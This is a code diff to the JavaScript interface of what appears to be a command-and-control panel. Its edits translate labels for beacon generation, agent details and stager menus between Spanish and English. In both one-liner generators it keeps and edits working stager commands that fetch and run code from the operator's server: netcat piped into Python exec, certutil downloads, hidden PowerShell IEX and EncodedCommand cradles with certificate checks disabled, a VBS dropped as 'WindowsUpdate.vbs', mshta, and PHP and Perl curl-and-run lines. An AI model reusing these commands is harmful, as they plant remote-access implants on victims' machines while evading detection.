@@ -316,6 +316,8 @@ const LANG = {
     topo_agent:'Agent', topo_host_label:'Host', topo_ip:'IP', topo_hostname:'Hostname',
     topo_user:'User', topo_os:'OS', topo_status:'Status', topo_status_on:'● Online', topo_status_off:'● Offline',
     topo_open_session:'Open session →',
+    lbl_location:'Location',
+    gen_copy_first:'Generate a beacon first', gen_copied_beacon:'Beacon code copied!', gen_copy_failed:'Copy failed',
   },
   es: {
     nav_sec_ops:'Operaciones', nav_sec_payloads:'Payloads', nav_sec_analysis:'Análisis',
@@ -425,6 +427,8 @@ const LANG = {
     topo_agent:'Agente', topo_host_label:'Host', topo_ip:'IP', topo_hostname:'Hostname',
     topo_user:'Usuario', topo_os:'SO', topo_status:'Estado', topo_status_on:'● En línea', topo_status_off:'● Sin conexión',
     topo_open_session:'Abrir sesión →',
+    lbl_location:'Ubicación',
+    gen_copy_first:'Primero genera un beacon', gen_copied_beacon:'¡Código copiado!', gen_copy_failed:'Error al copiar',
   }
 };
 
@@ -958,7 +962,7 @@ async function loadAgentInfo(agentId) {
     <div class="info-row"><span class="key">${t('col_user')}</span><span class="val" style="color:var(--accent2)">${escapeHtml(a.username || '—')}</span></div>
     <div class="info-row"><span class="key">${t('col_ip_int')}</span><span class="val">${escapeHtml(a.ip_internal || '—')}</span></div>
     ${a.ip_external ? `<div class="info-row"><span class="key">IP (Ext)</span><span class="val" style="color:var(--text2)">${escapeHtml(a.ip_external)}</span></div>` : ''}
-    ${(a.country || a.city) ? `<div class="info-row"><span class="key">Ubicación</span><span class="val">${countryFlag(a.country_code)} ${escapeHtml([a.city, a.country].filter(Boolean).join(', '))}</span></div>` : ''}
+    ${(a.country || a.city) ? `<div class="info-row"><span class="key">${t('lbl_location')}</span><span class="val">${countryFlag(a.country_code)} ${escapeHtml([a.city, a.country].filter(Boolean).join(', '))}</span></div>` : ''}
     <div class="info-row"><span class="key">${t('col_os')}</span><span class="val">${escapeHtml(a.os_info || '—')}</span></div>
     <div class="info-row"><span class="key">PID</span><span class="val">${a.pid || '—'}</span></div>
     <div class="info-row"><span class="key">Sleep</span><span class="val">${a.sleep_interval}s</span></div>
@@ -2873,27 +2877,27 @@ function svShowOneliners(token) {
       { label: 'nc (raw TCP)',  cmd: `(printf 'GET ${ncPath} HTTP/1.0\r\nHost: ${ncHost}\r\n\r\n'; sleep 1) | nc ${ncHost} ${ncPort} | python3 -c "import sys,builtins; b=sys.stdin.buffer.read(); c=b[b.find(bytes([13,10,13,10]))+4:]; exec(compile(c,'beacon.py','exec'),{'__file__':'beacon.py','__name__':'__main__','__builtins__':builtins})"` },
     ]},
     { title: '🪟 Windows', items: [
-      { label: 'PowerShell — llama python',  cmd: pyExec('python', url) },
-      { label: 'PowerShell — URL ofuscada',  cmd: `$u=(-join([char[]]@(${psDec})));python -c "import urllib.request,ssl,builtins; _c=ssl.create_default_context(); _c.check_hostname=False; _c.verify_mode=ssl.CERT_NONE; c=urllib.request.urlopen('$u',context=_c).read(); exec(compile(c,'beacon.py','exec'),{'__file__':'beacon.py','__name__':'__main__','__builtins__':builtins})"` },
+      { label: _lang==='es'?'PowerShell — llama python':'PowerShell — calls python',  cmd: pyExec('python', url) },
+      { label: _lang==='es'?'PowerShell — URL ofuscada':'PowerShell — obfuscated URL', cmd: `$u=(-join([char[]]@(${psDec})));python -c "import urllib.request,ssl,builtins; _c=ssl.create_default_context(); _c.check_hostname=False; _c.verify_mode=ssl.CERT_NONE; c=urllib.request.urlopen('$u',context=_c).read(); exec(compile(c,'beacon.py','exec'),{'__file__':'beacon.py','__name__':'__main__','__builtins__':builtins})"` },
       { label: 'mshta (HTA)',                cmd: `mshta ${hta_url}` },
       { label: 'certutil (cmd.exe)',         cmd: `cmd /c "certutil -urlcache -split -f \\"${url}\\" %TEMP%\\s.py & python %TEMP%\\s.py & del %TEMP%\\s.py"` },
       { label: 'certutil (PowerShell)',      cmd: `certutil -urlcache -split -f "${url}" $env:TEMP\\s.py; python $env:TEMP\\s.py; Remove-Item $env:TEMP\\s.py -Force -EA SilentlyContinue` },
       { label: 'VBS — WebClient (PS)',       cmd: `powershell -nop -w hidden -c "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};(New-Object Net.WebClient).DownloadFile('${vbs_url}','$env:TEMP\\WindowsUpdate.vbs');wscript '$env:TEMP\\WindowsUpdate.vbs'"` },
       { label: 'VBS — IWR (PS)',             cmd: `powershell -nop -w hidden -c "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};Invoke-WebRequest '${vbs_url}' -OutFile '$env:TEMP\\WindowsUpdate.vbs';wscript '$env:TEMP\\WindowsUpdate.vbs'"` },
-      { label: 'VBS — URL del archivo',      cmd: vbs_url },
+      { label: _lang==='es'?'VBS — URL del archivo':'VBS — File URL', cmd: vbs_url },
     ]},
     { title: '🔐 PowerShell AES', items: [
       {
-        label: 'IEX (descarga y ejecuta PS stager)',
+        label: _lang==='es'?'IEX (descarga y ejecuta PS stager)':'IEX (download & execute PS stager)',
         cmd: `powershell -nop -w hidden -c "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};IEX ((New-Object Net.WebClient).DownloadString('${ps_url}'))"`
       },
       {
         label: 'EncodedCommand (UTF-16LE base64)',
         cmd: `powershell -nop -w hidden -EncodedCommand ${_toUtf16LeBase64(`[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};IEX ((New-Object Net.WebClient).DownloadString('${ps_url}'))`)}`
       },
-      { label: 'URL del script PS1', cmd: ps_url },
+      { label: _lang==='es'?'URL del script PS1':'PS1 script URL', cmd: ps_url },
     ]},
-    { title: '🔧 Otros', items: [
+    { title: _lang==='es'?'🔧 Otros':'🔧 Others', items: [
       { label: 'PHP',  cmd: `php -r "passthru('curl -sk ${url} -o /tmp/s.py && python3 /tmp/s.py; rm -f /tmp/s.py');"` },
       { label: 'Perl', cmd: `perl -e "system('curl -sk ${url} -o /tmp/s.py && python3 /tmp/s.py; rm -f /tmp/s.py')"` },
     ]},
@@ -3564,7 +3568,7 @@ function setBeaconLang(lang) {
     if (_pyOnly) _schedCb.checked = false;
     if (_schedLbl) _schedLbl.style.opacity = _pyOnly ? '0.4' : '';
     if (_schedLbl) _schedLbl.style.cursor  = _pyOnly ? 'not-allowed' : '';
-    if (_schedLbl) _schedLbl.title         = _pyOnly ? 'Solo disponible en Python' : '';
+    if (_schedLbl) _schedLbl.title         = _pyOnly ? (_lang==='es'?'Solo disponible en Python':'Only available for Python') : '';
   }
   const _gp = document.getElementById('gen-placeholder');
   const _gi = document.getElementById('gen-output-inner');
@@ -5955,21 +5959,21 @@ function _getBeaconName() {
 
 function copyBeacon() {
   const code = document.getElementById('beacon-code').textContent;
-  if (!code) { showToast('Generate a beacon first', 'error'); return; }
+  if (!code) { showToast(t('gen_copy_first'), 'error'); return; }
   navigator.clipboard.writeText(code).then(() => {
-    // Flash all three copy buttons (whichever is visible)
+    // Flash all four copy buttons (whichever is visible)
     ['copy-btn', 'copy-btn-java', 'copy-btn-go', 'copy-btn-ps'].forEach(id => {
       const btn = document.getElementById(id);
-      if (btn) { const orig = btn.textContent; btn.textContent = '✓ Copied!'; setTimeout(() => btn.textContent = orig, 2000); }
+      if (btn) { const orig = btn.textContent; btn.textContent = '✓ ' + t('stager_copied'); setTimeout(() => btn.textContent = orig, 2000); }
     });
-    showToast('Beacon code copied!', 'success');
-  }).catch(() => showToast('Copy failed', 'error'));
+    showToast(t('gen_copied_beacon'), 'success');
+  }).catch(() => showToast(t('gen_copy_failed'), 'error'));
 }
 
 // ── Stager ────────────────────────────────────────────────
 function openStagerModal() {
   const code = document.getElementById('beacon-code').textContent;
-  if (!code.trim()) { showToast('Generate a beacon first', 'error'); return; }
+  if (!code.trim()) { showToast(t('gen_copy_first'), 'error'); return; }
   document.getElementById('stager-error').style.display = 'none';
   document.getElementById('stager-form').style.display = '';
   document.getElementById('stager-oneliners').style.display = 'none';
@@ -6117,32 +6121,32 @@ function _stagerShowOneliners(token) {
     {
       title: '🪟 Windows',
       items: [
-        { label: 'PowerShell — llama python', cmd: pyExec('python', url) },
-        { label: 'PowerShell — URL ofuscada', cmd: `$u=(-join([char[]]@(${psDec})));python -c "import urllib.request,ssl,builtins; _c=ssl.create_default_context(); _c.check_hostname=False; _c.verify_mode=ssl.CERT_NONE; c=urllib.request.urlopen('$u',context=_c).read(); exec(compile(c,'beacon.py','exec'),{'__file__':'beacon.py','__name__':'__main__','__builtins__':builtins})"` },
+        { label: _lang==='es'?'PowerShell — llama python':'PowerShell — calls python', cmd: pyExec('python', url) },
+        { label: _lang==='es'?'PowerShell — URL ofuscada':'PowerShell — obfuscated URL', cmd: `$u=(-join([char[]]@(${psDec})));python -c "import urllib.request,ssl,builtins; _c=ssl.create_default_context(); _c.check_hostname=False; _c.verify_mode=ssl.CERT_NONE; c=urllib.request.urlopen('$u',context=_c).read(); exec(compile(c,'beacon.py','exec'),{'__file__':'beacon.py','__name__':'__main__','__builtins__':builtins})"` },
         { label: 'mshta (HTA)',               cmd: `mshta ${hta_url}` },
         { label: 'certutil (cmd.exe)',         cmd: `cmd /c "certutil -urlcache -split -f \\"${url}\\" %TEMP%\\s.py & python %TEMP%\\s.py & del %TEMP%\\s.py"` },
         { label: 'certutil (PowerShell)',      cmd: `certutil -urlcache -split -f "${url}" $env:TEMP\\s.py; python $env:TEMP\\s.py; Remove-Item $env:TEMP\\s.py -Force -EA SilentlyContinue` },
         { label: 'VBS — WebClient (PS)',        cmd: `powershell -nop -w hidden -c "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};(New-Object Net.WebClient).DownloadFile('${vbs_url}','$env:TEMP\\WindowsUpdate.vbs');wscript '$env:TEMP\\WindowsUpdate.vbs'"` },
         { label: 'VBS — IWR (PS)',              cmd: `powershell -nop -w hidden -c "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};Invoke-WebRequest '${vbs_url}' -OutFile '$env:TEMP\\WindowsUpdate.vbs';wscript '$env:TEMP\\WindowsUpdate.vbs'"` },
-        { label: 'VBS — URL del archivo',       cmd: vbs_url },
+        { label: _lang==='es'?'VBS — URL del archivo':'VBS — File URL', cmd: vbs_url },
       ]
     },
     {
       title: '🔐 PowerShell AES',
       items: [
         {
-          label: 'IEX (descarga y ejecuta PS stager)',
+          label: _lang==='es'?'IEX (descarga y ejecuta PS stager)':'IEX (download & execute PS stager)',
           cmd: `powershell -nop -w hidden -c "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};IEX ((New-Object Net.WebClient).DownloadString('${ps_url}'))"`
         },
         {
           label: 'EncodedCommand (UTF-16LE base64)',
           cmd: `powershell -nop -w hidden -EncodedCommand ${_toUtf16LeBase64(`[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};IEX ((New-Object Net.WebClient).DownloadString('${ps_url}'))`)}`
         },
-        { label: 'URL del script PS1', cmd: ps_url },
+        { label: _lang==='es'?'URL del script PS1':'PS1 script URL', cmd: ps_url },
       ]
     },
     {
-      title: '🔧 Otros',
+      title: _lang==='es'?'🔧 Otros':'🔧 Others',
       items: [
         { label: 'PHP',  cmd: `php -r "passthru('curl -sk ${url} -o /tmp/s.py && python3 /tmp/s.py; rm -f /tmp/s.py');"` },
         { label: 'Perl', cmd: `perl -e "system('curl -sk ${url} -o /tmp/s.py && python3 /tmp/s.py; rm -f /tmp/s.py')"` },
